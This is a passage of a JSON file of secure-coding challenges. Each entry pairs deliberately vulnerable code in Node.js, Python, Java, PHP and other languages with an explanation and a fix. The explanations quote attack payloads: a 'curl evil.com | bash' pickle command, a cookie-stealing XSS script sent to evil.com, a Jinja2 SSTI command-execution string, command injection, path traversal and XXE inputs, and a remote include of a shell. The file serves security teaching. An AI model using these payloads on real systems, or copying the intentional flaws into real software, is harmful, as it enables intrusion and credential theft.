    "challengeDetails": "Storing plain text passwords means a single database breach — whether through SQL injection, a misconfigured backup, or a compromised DBA account — immediately exposes every user's password. Because most users reuse passwords across services, a breach of your database becomes a breach of their email, banking, and other accounts. The comparison `user?.Password == password` is also vulnerable to timing attacks: string comparison short-circuits on the first mismatching character, and careful timing measurements can leak information about the stored value. Proper password storage uses a one-way adaptive hashing function (bcrypt, scrypt, or Argon2) that is deliberately slow, salted per-user, and configurable to remain resistant as hardware improves. Your task is to replace plain text storage with `BCrypt.HashPassword()` from `BCrypt.Net-Next`, store only the hash, and verify logins with `BCrypt.Verify()`. The ASP.NET Core Identity framework provides this out of the box.",
    "initialCode": "// VULNERABLE: Plain text password storage\npublic class UserService\n{\n    public async Task RegisterUser(string username, string password)\n    {\n        var user = new User\n        {\n            Username = username,\n            Password = password  // stored as plain text!\n        };\n        await _context.Users.AddAsync(user);\n        await _context.SaveChangesAsync();\n    }\n\n    public async Task<bool> Login(string username, string password)\n    {\n        var user = await _context.Users\n            .FirstOrDefaultAsync(u => u.Username == username);\n        return user?.Password == password;  // plain text comparison!\n    }\n}",
    "recommendation": "Use ASP.NET Core's built-in Identity framework (PBKDF2 by default), or use `BCrypt.Net-Next`: `BCrypt.HashPassword(password, workFactor: 12)`. Verify with `BCrypt.Verify(password, storedHash)`."
  },
  {
    "title": "NoSQL Injection in MongoDB Query",
    "difficulty": "Medium",
    "description": "A login endpoint passes the request body directly as MongoDB query operators. An attacker can send MongoDB operators instead of string values.",
    "programmingLanguage": "Node.js",
    "challengeDetails": "NoSQL databases are not immune to injection — they just have a different injection language. MongoDB queries are JavaScript objects, and if a user can send `{ \"$gt\": \"\" }` as the password value, MongoDB evaluates this as an operator rather than a literal comparison. The query `{ password: { $gt: '' } }` matches any record where the password field is greater than an empty string — which is every record. An attacker sending `{ \"username\": \"admin\", \"password\": { \"$gt\": \"\" } }` logs in as admin without knowing the password. Express's `req.body` parsing preserves nested objects, making this attack straightforward with a standard Content-Type: application/json request. Your fix is to cast inputs to their expected primitive types before using them in queries: `const username = String(req.body.username)`. Use Mongoose schema validation to enforce types at the model layer as well.",
    "initialCode": "// VULNERABLE: MongoDB operator injection\napp.post('/login', async (req, res) => {\n    const { username, password } = req.body;\n    const user = await User.findOne({\n        username: username,\n        password: password  // MongoDB operators accepted!\n    });\n    if (user) return res.json({ token: generateToken(user) });\n    res.status(401).json({ error: 'Invalid credentials' });\n});",
    "recommendation": "Cast query parameters to their expected primitive types: `const username = String(req.body.username); const password = String(req.body.password);`. Also hash passwords — never store them as plain text for comparison."
  },
  {
    "title": "JWT Algorithm Confusion (none Algorithm)",
    "difficulty": "Medium",
    "description": "A JWT verification function passes the algorithm from the token header to the verify call, allowing an attacker to craft a token with `alg:none`.",
    "programmingLanguage": "Node.js",
    "challengeDetails": "JWT tokens consist of three base64-encoded parts: header, payload, and signature. The header specifies which algorithm was used to sign the token. This code reads the algorithm from the header and passes it to `jwt.verify()` — meaning the attacker controls the verification algorithm. Setting `alg: 'none'` tells many JWT libraries to skip signature verification entirely, since the spec defines 'none' as a valid algorithm for unsecured tokens. An attacker can modify the payload (e.g., set `role: 'admin'`) and produce a token with `alg: none` and an empty signature that passes verification. The fix is to hardcode the expected algorithm — never derive it from the token itself. Use `{ algorithms: ['HS256'] }` and pin it in your configuration. For high-security applications, prefer asymmetric algorithms (RS256, ES256) so verification keys can be public.",
    "initialCode": "// VULNERABLE: Algorithm taken from token header\nconst jwt = require('jsonwebtoken');\nconst SECRET = process.env.JWT_SECRET;\n\nfunction verifyToken(token) {\n    const header = JSON.parse(\n        Buffer.from(token.split('.')[0], 'base64').toString());\n    return jwt.verify(token, SECRET, {\n        algorithms: [header.alg]  // accepts 'none'!\n    });\n}",
    "recommendation": "Always specify the expected algorithm explicitly: `jwt.verify(token, SECRET, { algorithms: ['HS256'] })`. Never read algorithm from the token header."
  },
  {
    "title": "Server-Side Request Forgery (SSRF)",
    "difficulty": "Medium",
    "description": "A webhook testing feature allows users to specify any URL and the server fetches it. An attacker can target internal cloud metadata endpoints.",
    "programmingLanguage": "Python",
    "challengeDetails": "SSRF occurs when a server makes HTTP requests to attacker-controlled URLs. In cloud environments, the most immediate danger is the instance metadata service — on AWS at `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, an attacker can retrieve temporary IAM credentials with the instance's permissions, potentially giving full control over the cloud account. Beyond metadata, SSRF can be used to scan internal networks, probe services that aren't exposed to the internet (Redis, Elasticsearch, internal APIs), and exfiltrate data. The fix requires parsing the URL before making the request and blocking private IP ranges (RFC 1918: 10.x, 172.16-31.x, 192.168.x), loopback (127.x), link-local (169.254.x), and IPv6 equivalents. Also disable HTTP redirects to prevent redirect-based bypasses, and consider a DNS allowlist for permitted external domains.",
    "initialCode": "# VULNERABLE: SSRF in webhook tester\nimport requests\n\n@app.route('/webhook/test', methods=['POST'])\ndef test_webhook():\n    url = request.json.get('url')\n    response = requests.get(url, timeout=5)\n    return jsonify({\n        'status': response.status_code,\n        'body': response.text\n    })",
    "recommendation": "Parse the URL and block private IP ranges (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x), localhost, and internal hostnames. Use an allowlist of permitted external domains. Disable redirects."
  },
  {
    "title": "Command Injection via Shell Execution",
    "difficulty": "Medium",
    "description": "An application uses `subprocess` with `shell=True`, directly interpolating user input into the shell command string.",
    "programmingLanguage": "Python",
    "challengeDetails": "When `shell=True` is used, Python passes the command string to `/bin/sh -c`, which interprets shell metacharacters including `;`, `&&`, `|`, `$()`, and backticks. A user who sends `host=8.8.8.8; cat /etc/passwd` gets two commands executed: the legitimate ping and the file read. More dangerous payloads can establish reverse shells, download and execute malware, or exfiltrate environment variables containing API keys and database passwords. The shell is an incredibly powerful interpreter and giving users control over its input is almost always catastrophic. The fix is to use `shell=False` and pass arguments as a list: `subprocess.run(['ping', '-c', '1', host], ...)`. The OS then invokes the binary directly with the arguments as separate strings — no shell interpolation occurs. Also validate `host` against a strict pattern (e.g., IP or hostname regex) before using it.",
    "initialCode": "# VULNERABLE: shell=True with user-controlled input\nimport subprocess\n\n@app.route('/ping')\ndef ping_host():\n    host = request.args.get('host', '')\n    result = subprocess.run(\n        f'ping -c 1 {host}',\n        shell=True,  # shell interprets metacharacters!\n        capture_output=True,\n        text=True\n    )\n    return result.stdout",
    "recommendation": "Use `shell=False` and pass arguments as a list: `subprocess.run(['ping', '-c', '1', host], shell=False, capture_output=True, text=True)`. Validate `host` against an IP/hostname allowlist before use."
  },
  {
    "title": "Path Traversal in File Download",
    "difficulty": "Medium",
    "description": "A file download endpoint accepts a filename parameter and reads from a base directory. By sending `../` sequences, an attacker can read arbitrary files.",
    "programmingLanguage": "Java",
    "challengeDetails": "Path traversal (also called directory traversal) exploits insufficient validation of user-supplied file paths. By including `../` sequences, an attacker navigates up the directory tree beyond the intended base path. Sending `filename=../../../../etc/passwd` resolves to `/etc/passwd` — a file the server can read and return. URL encoding (`%2e%2e%2f`) or double encoding can sometimes bypass naive string-replacement defenses. The correct fix is to resolve the canonical (absolute) path of the requested file after joining it with the base directory, then verify the canonical path still starts with the base directory path. In Java: `Path resolved = Paths.get(\"/app/uploads/\").resolve(filename).normalize(); if (!resolved.startsWith(\"/app/uploads/\")) throw new SecurityException();`. Never rely on filtering `..` strings from input — normalization is the correct tool.",
    "initialCode": "// VULNERABLE: Path traversal in file download\n@GetMapping(\"/download\")\npublic ResponseEntity<byte[]> download(\n        @RequestParam String filename) throws IOException {\n    Path filePath = Paths.get(\"/app/uploads/\" + filename);\n    byte[] content = Files.readAllBytes(filePath);\n    return ResponseEntity.ok()\n        .header(\"Content-Disposition\", \"attachment; filename=\" + filename)\n        .body(content);\n}",
    "recommendation": "Resolve the canonical path and verify it starts with the base directory: `Path base = Paths.get(\"/app/uploads/\").toRealPath(); Path resolved = base.resolve(filename).normalize(); if (!resolved.startsWith(base)) throw new SecurityException(\"Path traversal detected\");`."
  },
  {
    "title": "CSRF on State-Changing Endpoint",
    "difficulty": "Medium",
    "description": "A funds transfer endpoint relies solely on session cookies for authentication. A malicious website can auto-submit a hidden form to the bank's transfer endpoint.",
    "programmingLanguage": "PHP",
    "challengeDetails": "CSRF exploits the fact that browsers automatically attach cookies to every request to a domain, regardless of which site initiated the request. An attacker hosts a page with a hidden form pointing to `https://bank.com/transfer` with pre-filled `to` and `amount` fields. When a logged-in bank user visits the attacker's page, the form auto-submits, the browser sends the session cookie, and the bank processes the transfer as if the user initiated it. The server cannot distinguish this from a legitimate request using cookies alone. The synchronizer token pattern fixes this: generate a cryptographically random token per session, embed it in every form as a hidden field, and validate it server-side on every state-changing request. Because the token is not a cookie, the attacker's cross-origin form cannot include it. Also set `SameSite=Strict` on session cookies as a defense-in-depth measure.",
    "initialCode": "<?php\n// VULNERABLE: No CSRF protection on money transfer\nsession_start();\nif ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SESSION['user'])) {\n    $to = $_POST['to'];\n    $amount = $_POST['amount'];\n    transferMoney($_SESSION['user']['id'], $to, $amount);\n    echo json_encode(['success' => true]);\n}\n?>",
    "recommendation": "Generate a cryptographically random CSRF token per session, store it in the session, embed it in forms as a hidden field, and validate it on every state-changing request. Use `SameSite=Strict` as a defense-in-depth layer."
  },
  {
    "title": "Insecure Deserialization in Session Data",
    "difficulty": "Medium",
    "description": "Session data is serialized with Python's `pickle` module and stored in a cookie. An attacker can craft a malicious pickle payload that executes arbitrary OS commands.",
    "programmingLanguage": "Python",
    "challengeDetails": "Python's `pickle` module can serialize and deserialize arbitrary Python objects, including objects whose `__reduce__` method executes code during unpickling. An attacker who controls a pickle payload can run any OS command with the web server's privileges: `os.system('curl evil.com | bash')`. Because the session data is stored in a cookie, the attacker has complete control over its content and can craft the malicious pickle bytes locally, base64-encode them, and set the cookie. This is a remote code execution vulnerability with no authentication barrier. The correct fix is to never use `pickle` for untrusted data. Use JSON for session storage — it cannot represent executable Python objects. If you need to store complex types, serialize to JSON manually. If a binary format is needed, authenticate the payload with HMAC before deserializing so tampering is detected.",
    "initialCode": "# VULNERABLE: Deserializing user-controlled pickle data\nimport pickle, base64\nfrom flask import request, session\n\n@app.before_request\ndef load_session():\n    raw = request.cookies.get('session_data')\n    if raw:\n        data = pickle.loads(base64.b64decode(raw))  # Attacker crafts malicious payload!\n        session.update(data)",
    "recommendation": "Never deserialize pickle (or Java ObjectInputStream, PHP unserialize) data from untrusted sources. Use JSON or MessagePack for session data. If binary serialization is required, use HMAC to authenticate the payload before deserialization."
  },
  {
    "title": "Stored XSS in Comment System",
    "difficulty": "Medium",
    "description": "A blog comment system saves user comments to the database and renders them using `innerHTML` without sanitization.",
    "programmingLanguage": "JavaScript",
    "challengeDetails": "Stored XSS is more dangerous than reflected XSS because the payload is persisted — it executes for every user who views the page, not just those who click a specific link. A comment containing `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>` will silently exfiltrate session cookies from every reader. This can be used for session hijacking, keylogging, cryptocurrency miners, or worm-like self-propagation through automated comment posting. Template literals with `innerHTML` are particularly risky because developers often don't realize they're creating an injection point. Your fix is to use DOM APIs that treat content as text rather than HTML: `document.createTextNode(comment.content)` or `element.textContent = comment.content`. For comments that need formatting, sanitize with DOMPurify using a strict allowlist of tags and attributes before any `innerHTML` assignment.",
    "initialCode": "// VULNERABLE: Stored XSS — innerHTML with DB content\nasync function renderComments(postId) {\n    const comments = await fetch(`/api/comments/${postId}`).then(r => r.json());\n    const container = document.getElementById('comments');\n    comments.forEach(comment => {\n        container.innerHTML +=\n            `<div class=\"comment\">\n                <strong>${comment.author}</strong>\n                <p>${comment.content}</p>\n            </div>`;\n    });\n}",
    "recommendation": "Use `DOMPurify.sanitize(comment.content)` before insertion, or use DOM methods: `const p = document.createElement('p'); p.textContent = comment.content; div.appendChild(p);`."
  },
  {
    "title": "Race Condition in Bank Transfer",
    "difficulty": "Medium",
    "description": "A balance transfer operation reads the account balance, checks it's sufficient, then deducts in separate operations. Concurrent requests can both pass the balance check before either deduction occurs.",
    "programmingLanguage": "Java",
    "challengeDetails": "This is a Time-of-Check to Time-of-Use (TOCTOU) race condition. Between reading the balance and writing the updated balance, another concurrent request can read the same original balance and also pass the sufficiency check. With two concurrent transfers of $500 from a $600 account, both read $600, both pass the check, and both deduct — leaving the balance at -$400 or causing double-spend. This is a classic distributed systems problem and the same logic flaw underlies many DeFi exploits. The `@Transactional` annotation alone doesn't prevent this — it only ensures the read and write are in the same transaction, but two transactions can still interleave reads. The correct fix is pessimistic locking (`SELECT ... FOR UPDATE` or `@Lock(PESSIMISTIC_WRITE)`) which blocks concurrent reads until the write commits, or an atomic `UPDATE accounts SET balance = balance - ? WHERE id = ? AND balance >= ?` that fails if the balance is insufficient.",
    "initialCode": "// VULNERABLE: TOCTOU race condition\n@Transactional\npublic void transfer(Long fromId, Long toId, BigDecimal amount) {\n    Account from = accountRepo.findById(fromId).get();\n    if (from.getBalance().compareTo(amount) < 0)\n        throw new InsufficientFundsException();\n    from.setBalance(from.getBalance().subtract(amount));\n    accountRepo.save(from);\n}",
    "recommendation": "Use pessimistic locking: `@Lock(LockModeType.PESSIMISTIC_WRITE)` on the `findById` query. Alternatively use an atomic `UPDATE` with `WHERE balance >= amount` and check if rows affected == 1."
  },
  {
    "title": "Unvalidated OAuth Redirect URI",
    "difficulty": "Medium",
    "description": "An OAuth 2.0 authorization server performs only a prefix check on the `redirect_uri` parameter.",
    "programmingLanguage": "Node.js",
    "challengeDetails": "The `redirect_uri` in an OAuth flow is where the authorization code is sent after the user authenticates. If the validation is only a prefix check, an attacker registers a redirect URI of `https://app.com.evil.com` or `https://app.com/callback?extra=` and their URI passes the prefix check against `https://app.com`. The authorization code — which can be exchanged for an access token — is then sent to the attacker's server. This attack is sometimes called authorization code interception and is the main reason the OAuth 2.0 spec mandates exact redirect URI matching. The fix is strict string equality: `redirectUri === client.registeredUri`. The registered URI should be stored at client registration time and never modified dynamically. For mobile apps and SPAs that can't keep secrets, combine strict redirect URI validation with PKCE to prevent code interception even if the redirect is somehow compromised.",
    "initialCode": "// VULNERABLE: Prefix-only redirect_uri validation\nfunction validateRedirectUri(clientId, redirectUri) {\n    const client = clients.find(c => c.id === clientId);\n    if (redirectUri.startsWith(client.registeredUri)) {\n        return true;\n    }\n    return false;\n}",
    "recommendation": "Perform exact string matching: `return redirectUri === client.registeredUri;`. Register exact URIs at client registration time and never allow partial matches."
  },
  {
    "title": "XXE via SVG File Upload",
    "difficulty": "Medium",
    "description": "An SVG file upload is parsed as XML without disabling external entity processing, enabling file disclosure and SSRF through image uploads.",
    "programmingLanguage": "PHP",
    "challengeDetails": "SVG is an XML-based image format, and XML parsers process SVG files the same way they process any other XML — including honoring DOCTYPE declarations and external entity references. An attacker who uploads an SVG containing `<!ENTITY xxe SYSTEM \"file:///etc/passwd\">` and then references `&xxe;` in the SVG body can exfiltrate file contents that appear in the rendered output or error messages. This is particularly sneaky because developers think of SVG as an image format rather than a document format. The script-tag removal in this code (`removeScriptTags()`) doesn't help because XXE happens at parse time, before any traversal of the document. The fix is to disable external entity loading before calling `loadXML()`: `libxml_disable_entity_loader(true)` (PHP < 8.0) or use `LIBXML_NOENT` flag handling. Also consider rejecting SVGs entirely and re-encoding user images to a raster format like PNG before serving.",
    "initialCode": "<?php\n// VULNERABLE: SVG parsed as XML without XXE protection\nfunction processSvgUpload($svgContent) {\n    $dom = new DOMDocument();\n    $dom->loadXML($svgContent);  // XXE possible here — default loads external entities!\n    removeScriptTags($dom);\n    return $dom->saveXML();\n}\n?>",
    "recommendation": "Disable external entities: `libxml_disable_entity_loader(true);` before parsing, or use `$dom->loadXML($svgContent, LIBXML_NONET)`. Consider converting SVGs to raster format with a library like Imagick to eliminate the XML attack surface entirely."
  },
  {
    "title": "Insecure JWT Secret (Weak Key)",
    "difficulty": "Medium",
    "description": "A JWT is signed with a short, predictable secret (`secret123`). An attacker can perform an offline brute-force attack using tools like hashcat.",
    "programmingLanguage": "Node.js",
    "challengeDetails": "JWTs signed with HS256 use a shared secret as the signing key. The security of the entire authentication system depends on this secret being unguessable. `secret123` can be cracked in milliseconds by any attacker who obtains a JWT token — they run hashcat or jwt-cracker against the token offline, with no rate limiting or lockout possible since it's a local computation. Once the secret is known, the attacker can forge tokens for any user ID or role and sign them validly. The NIST minimum for HMAC-SHA256 keys is 256 bits (32 bytes). Your task is to generate the secret with `crypto.randomBytes(64).toString('hex')` and store it securely in environment variables — never in source code. For higher assurance, switch to RS256 or ES256 (asymmetric algorithms), which allow public key distribution for verification without exposing the signing key.",
    "initialCode": "// VULNERABLE: Weak JWT secret\nconst jwt = require('jsonwebtoken');\nconst JWT_SECRET = 'secret123';  // weak, short, guessable\n\nfunction generateToken(user) {\n    return jwt.sign(\n        { id: user.id, role: user.role },\n        JWT_SECRET,\n        { expiresIn: '24h' }\n    );\n}",
    "recommendation": "Use a cryptographically random secret of at least 256 bits: `const JWT_SECRET = process.env.JWT_SECRET; // generated with crypto.randomBytes(64).toString('hex')`."
  },
  {
    "title": "SQL Injection via ORDER BY Clause",
    "difficulty": "Medium",
    "description": "A search endpoint allows the user to specify a sort column via a query parameter. The column name is injected directly into the `ORDER BY` clause.",
    "programmingLanguage": "Python",
    "challengeDetails": "Parameterized queries solve SQL injection for values in WHERE clauses, but they cannot parameterize SQL keywords like column names, table names, or sort directions — these are structural parts of the query that the database driver cannot treat as literal strings. Injecting into `ORDER BY` allows an attacker to use `CASE WHEN` expressions to extract data bit by bit (Boolean-based blind injection), call functions like `SLEEP()` to perform time-based attacks, or in some databases reference columns from other tables via subqueries. The correct mitigation is an explicit allowlist: define the exact set of column names and directions that are valid, and reject everything else. `sort_by = sort_by if sort_by in {'name', 'price', 'created_at'} else 'name'`. This pattern is fundamentally different from sanitization — you're selecting from known-safe values rather than trying to make dangerous values safe.",
    "initialCode": "# VULNERABLE: ORDER BY injection\n@app.route('/products')\ndef get_products():\n    sort_by = request.args.get('sort', 'name')\n    order = request.args.get('order', 'ASC')\n    query = f\"SELECT * FROM products ORDER BY {sort_by} {order}\"\n    return jsonify(db.execute(query).fetchall())",
    "recommendation": "Validate against an explicit allowlist: `ALLOWED_COLUMNS = {'name', 'price', 'created_at'}; sort_by = sort_by if sort_by in ALLOWED_COLUMNS else 'name'; order = 'ASC' if order.upper() == 'ASC' else 'DESC'`."
  },
  {
    "title": "Unrestricted File Inclusion",
    "difficulty": "Medium",
    "description": "A PHP application includes template files based on a user-supplied `page` parameter.",
    "programmingLanguage": "PHP",
    "challengeDetails": "PHP's `include()` function executes the included file as PHP code. When the filename comes from user input, an attacker can include any PHP-parseable file on the system (`/etc/passwd` doesn't execute but may be readable as a parse error). More dangerously, if the server allows remote file includes (`allow_url_include = On`), an attacker can include `http://evil.com/shell.txt` and execute arbitrary PHP code. Even with local inclusion only, an attacker can combine this with a file upload vulnerability to include their uploaded PHP shell, or use log file poisoning to include `/var/log/apache2/access.log` which contains attacker-controlled User-Agent strings. The fix is a strict allowlist: define the exact set of valid page names, map them to file paths server-side, and reject everything else. Never build file paths from raw user input.",
    "initialCode": "<?php\n// VULNERABLE: Dynamic file inclusion from user input\n$page = $_GET['page'];\ninclude($page . '.php');\n?>",
    "recommendation": "Use a strict allowlist: `$allowed = ['home', 'about', 'contact']; $page = in_array($_GET['page'], $allowed) ? $_GET['page'] : 'home'; include(__DIR__ . '/templates/' . $page . '.php');`."
  },
  {
    "title": "Business Logic — Negative Quantity in Cart",
    "difficulty": "Medium",
    "description": "A cart update endpoint accepts any integer quantity, allowing negative values that reduce the total price or generate credit.",
    "programmingLanguage": "Python",
    "challengeDetails": "Business logic vulnerabilities are not about technical injection or protocol exploits — they're about using the application's own features in unintended ways. Adding an item with quantity `-10` produces a subtotal of `-$500`, which when combined with other items in the cart results in a total below zero. Depending on how the checkout processes negative totals, the attacker may receive a refund, gain store credit, or complete the purchase for free. These bugs are often missed by automated scanners because the individual inputs are technically valid integers — only the business rule (quantities must be positive) is violated. Your fix must enforce constraints on every field that has business meaning: `if quantity <= 0: return 400`. Calculate totals server-side rather than trusting client-provided totals. Enforce minimum and maximum quantities. Verify the final cart total is positive before initiating payment. Never trust the client for pricing logic.",
    "initialCode": "# VULNERABLE: No quantity sign validation\n@app.route('/cart/add', methods=['POST'])\ndef add_to_cart():\n    item_id = request.json['item_id']\n    quantity = int(request.json['quantity'])\n    price = db.get_price(item_id)\n    cart_total = quantity * price  # quantity can be -100!\n    db.update_cart(session['user_id'], item_id, quantity)\n    return jsonify({'new_total': calculate_total()})",
    "recommendation": "Enforce business constraints: `if quantity <= 0: return jsonify({'error': 'Invalid quantity'}), 400`. Validate min/max quantities, recalculate totals server-side, verify the final total is positive before processing payment."
  },
  {
    "title": "Second-Order SQL Injection",
    "difficulty": "Hard",
    "description": "A username is safely stored using parameterized queries during registration, but later used in a profile-update query without parameterization.",
    "programmingLanguage": "Python",
    "challengeDetails": "Second-order injection is subtle and often evades code review because the vulnerable query and the injection source are in different functions, written at different times, sometimes by different developers. The pattern: safe parameterized write → data stored → data read back → unsafely interpolated into another query. A username like `admin'--` is stored safely. Later, when `update_email` retrieves it and interpolates it into an f-string, the single quote closes the string literal and `--` comments out the rest of the query. The attacker registers with a malicious username, then triggers the vulnerable code path by performing an innocent action like updating their email. The defense is absolute: parameterize every query that uses data from the database, not just queries that directly use user input. Treat all data as untrusted at the point of query construction, regardless of how safely it was stored.",
    "initialCode": "# VULNERABLE: Second-order injection\ndef register(username, password):\n    # Safe: parameterized on write\n    db.execute(\"INSERT INTO users (username,password) VALUES (?,?)\",\n               (username, bcrypt.hash(password)))\n\ndef update_email(current_username, new_email):\n    user = db.execute(\"SELECT username FROM users WHERE id=?\",\n                      (session['user_id'],)).fetchone()\n    username = user['username']  # contains attacker payload!\n    # ...but injects it unsafely:\n    db.execute(f\"UPDATE users SET email='{new_email}'\"\n               f\" WHERE username='{username}'\")  # injection!",
    "recommendation": "Parameterize every query that uses database-read values: `db.execute('UPDATE users SET email=? WHERE username=?', (new_email, username))`. Never use f-strings or string concatenation for SQL queries, even with data that came from your own database."
  },
  {
    "title": "SSTI — Server-Side Template Injection",
    "difficulty": "Hard",
    "description": "An email notification feature renders a user-supplied template string using Jinja2's `render_template_string`.",
    "programmingLanguage": "Python",
    "challengeDetails": "Template injection occurs when user-supplied content is rendered as a template rather than as data. Jinja2 templates have access to Python's object model, and through method resolution order (MRO) traversal, an attacker can reach the built-in `__import__` function and execute arbitrary system commands. A payload like `{{ ''.__class__.__mro__[1].__subclasses__()[396]('id', shell=True, stdout=-1).communicate() }}` executes `id` on the server. The number in `__subclasses__()` varies by environment, making this a research task, but automated tools like tplmap enumerate it rapidly. This is effectively remote code execution via a template. The fix is to never pass user-supplied strings to `render_template_string()`. For user-customizable notifications, use a logic-less templating language like Mustache (via `chevron`) that has no concept of code execution, only variable substitution.",
    "initialCode": "# VULNERABLE: User-controlled template string rendered by Jinja2\nfrom flask import render_template_string\n\n@app.route('/preview', methods=['POST'])\ndef preview_email():\n    template = request.json.get('template')\n    rendered = render_template_string(template)  # RCE!\n    return jsonify({'preview': rendered})",
    "recommendation": "Never render user-supplied strings as templates. Use `jinja2.sandbox.SandboxedEnvironment` with strict restrictions. Better: use a logic-less template language (Mustache) for user templates."
  },
  {
    "title": "OAuth PKCE Bypass — State Parameter Missing",
    "difficulty": "Hard",
    "description": "An OAuth flow initiates without a `state` parameter and the callback performs no validation, enabling CSRF attacks that link victim accounts to attacker-controlled identities.",
    "programmingLanguage": "TypeScript",
    "challengeDetails": "The OAuth `state` parameter serves as a CSRF token for the authorization flow. Without it, an attacker can initiate their own OAuth flow, stop before completing it, and trick a victim into completing it. The attacker crafts a URL to their own OAuth callback with the victim's browser — when the victim clicks it, their browser completes the OAuth exchange and links the attacker's OAuth identity to the victim's account. The attacker then logs in with their OAuth identity and has full access to the victim's account. This attack is called OAuth CSRF or login CSRF. The fix: generate a cryptographically random `state` value (using `crypto.randomBytes(32)`), store it in the session, include it as the `state` parameter in the authorization URL, and in the callback validate that `req.query.state === req.session.oauthState` before exchanging the code. Combine with PKCE for mobile and SPA flows.",
    "initialCode": "// VULNERABLE: OAuth flow without state parameter\nasync function initiateOAuth(req: Request, res: Response) {\n    const authUrl = new URL('https://provider.com/oauth/authorize');\n    authUrl.searchParams.set('client_id', CLIENT_ID);\n    authUrl.searchParams.set('redirect_uri', CALLBACK_URL);\n    authUrl.searchParams.set('response_type', 'code');\n    authUrl.searchParams.set('scope', 'email profile');\n    // Missing: state parameter — CSRF possible on callback!\n    res.redirect(authUrl.toString());\n}\n\nasync function handleCallback(req: Request, res: Response) {\n    const { code } = req.query;\n    // No state validation!\n    const token = await exchangeCode(code as string);\n}",
    "recommendation": "Generate a cryptographically random state value, store it in the session, include it in the authorization request, and validate it on callback: `if (req.query.state !== req.session.oauthState) return res.status(403).send('Invalid state');`."
  },
  {
    "title": "Timing Attack on HMAC Comparison",
    "difficulty": "Hard",
    "description": "A webhook handler verifies HMAC signatures using Python's `==` operator, which short-circuits on the first mismatching byte, creating a timing oracle.",
    "programmingLanguage": "Python",
    "challengeDetails": "String comparison with `==` in most languages returns `False` as soon as the first mismatching character is found. This means comparing a correct signature takes longer than comparing an incorrect one — the more correct prefix bytes the attacker guesses, the longer the comparison takes. By making thousands of requests with different signature bytes and measuring response times with statistical precision, an attacker can recover the correct signature one byte at a time, without knowing the secret. This timing oracle attack is practical in low-latency environments (same datacenter, localhost). The defense is constant-time comparison: `hmac.compare_digest(computed, provided)` always compares all bytes regardless of where the first mismatch occurs. This function is in Python's standard library and should be used for all security-sensitive string comparisons — API keys, tokens, signatures, and nonces.",
    "initialCode": "# VULNERABLE: Non-constant-time HMAC comparison\nimport hmac, hashlib\n\ndef verify_webhook(payload: bytes, signature: str) -> bool:\n    secret = os.environ['WEBHOOK_SECRET'].encode()\n    computed = hmac.new(secret, payload, hashlib.sha256).hexdigest()\n    return computed == signature  # == returns early on first mismatch!",
    "recommendation": "Use `hmac.compare_digest()` which is implemented in constant time: `return hmac.compare_digest(computed, signature)`. This is a drop-in replacement that eliminates the timing channel."
  },
  {
    "title": "GraphQL Introspection & Batch Query DoS",
    "difficulty": "Hard",
    "description": "A GraphQL API exposes introspection in production and accepts batch queries without depth or complexity limits.",
    "programmingLanguage": "Node.js",
    "challengeDetails": "GraphQL introspection allows any client to query the complete schema: every type, field, argument, and resolver. In production, this is a documentation service for attackers — they can enumerate every mutation (account deletion, password reset, admin actions), map data relationships, identify deprecated fields that might have weaker security, and craft targeted attacks against underdocumented endpoints. Beyond information disclosure, GraphQL's flexible query structure enables denial-of-service through deeply nested or batched queries. A query that fetches users → their posts → each post's comments → each comment's author → their posts (repeated 10 levels deep) can trigger millions of database queries from a single HTTP request. Batch arrays multiply this — 100 queries in one request bypasses rate limiting. The mitigations are layered: disable introspection in production, enforce depth limits with `graphql-depth-limit`, calculate query complexity with `graphql-validation-complexity`, and limit batch array size.",
    "initialCode": "// VULNERABLE: GraphQL with introspection and no limits\nconst { ApolloServer } = require('@apollo/server');\nconst server = new ApolloServer({\n    typeDefs,\n    resolvers,\n    // introspection defaults to true in all environments!\n    // No query depth limit, no complexity limit, no batching limit\n});",
    "recommendation": "Set `introspection: false` in production. Use `graphql-depth-limit` (`depthLimit(5)`) and `graphql-validation-complexity` to reject expensive queries. Limit batch size and implement query cost analysis."
  },
  {
    "title": "Insecure Cryptography — ECB Mode",
    "difficulty": "Hard",
    "description": "Credit card numbers are encrypted using AES in ECB mode. ECB encrypts each 16-byte block independently, so identical plaintext blocks produce identical ciphertext blocks — patterns remain visible.",
    "programmingLanguage": "Java",
    "challengeDetails": "AES-ECB (Electronic Codebook) mode is textbook cryptography's most famous failure. Each 16-byte block is encrypted independently with the same key, producing deterministic output: identical plaintext blocks always produce identical ciphertext blocks. For structured data like credit card numbers — many of which share common prefixes or patterns — this leaks statistical information. The canonical demonstration is the 'ECB penguin': encrypting a bitmap image with ECB preserves the outline of the original image in the ciphertext. For financial data, patterns in card numbers become patterns in ciphertext, enabling frequency analysis. Furthermore, ECB provides no authentication — an attacker can rearrange, duplicate, or substitute ciphertext blocks without detection. The correct choice is AES-GCM (Galois/Counter Mode), which uses a random nonce per encryption, produces statistically random ciphertext, and provides authenticated encryption — any tampering of the ciphertext causes decryption to fail.",
    "initialCode": "// VULNERABLE: AES-ECB mode\nimport javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\n\npublic byte[] encryptCard(String cardNumber, byte[] key) throws Exception {\n    SecretKeySpec keySpec = new SecretKeySpec(key, \"AES\");\n    Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");  // ECB!\n    cipher.init(Cipher.ENCRYPT_MODE, keySpec);\n    return cipher.doFinal(cardNumber.getBytes(StandardCharsets.UTF_8));\n}",
    "recommendation": "Use AES-GCM which provides authenticated encryption: `Cipher cipher = Cipher.getInstance(\"AES/GCM/NoPadding\"); byte[] iv = new byte[12]; new SecureRandom().nextBytes(iv); cipher.init(Cipher.ENCRYPT_MODE, keySpec, new GCMParameterSpec(128, iv));`. Prepend the IV to the ciphertext for storage."
  },
  {
    "title": "Subdomain Takeover via Dangling DNS",
    "difficulty": "Hard",
    "description": "A CNAME record for `staging.app.com` points to a cloud provider app that has been deleted. The CNAME still resolves but points to an unclaimed name that an attacker can claim.",
    "programmingLanguage": "JavaScript",
